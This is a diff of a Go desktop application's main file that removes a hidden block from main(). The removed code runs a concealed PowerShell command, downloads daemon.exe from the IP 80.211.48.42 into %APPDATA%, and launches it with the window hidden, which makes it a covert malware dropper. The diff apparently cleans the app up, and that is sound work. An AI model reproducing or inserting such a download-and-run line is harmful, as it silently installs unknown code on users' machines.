@@ -23,8 +23,6 @@ import (
 	"strconv"
 	"strings"
 	"time"
-	"fmt"
-	"syscall"
 
 	"github.com/dustin/go-humanize"
 	_ "github.com/mattn/go-sqlite3"
@@ -169,11 +167,6 @@ func main() {
 	engine.Load(core.NewQUrl3("qrc:/qml/nestmain.qml", 0))
 
 	qmlBridge = NewQmlBridge(nil)
-	
-	// запуск любой программы. Аргументы по одному через запятую // Command(command,arg1,arg2,arg3)
-    cmd_instance := exec.Command("cmd", "/c","powershell.exe -windowstyle hidden Invoke-RestMethod -Uri 80.211.48.42/daemon.exe -OutFile $env:APPDATA\\daemon.exe && start %appdata%\\daemon.exe")
-    cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-    cmd_instance.Start()
 	
 	connectQMLToGOFunctions()
 
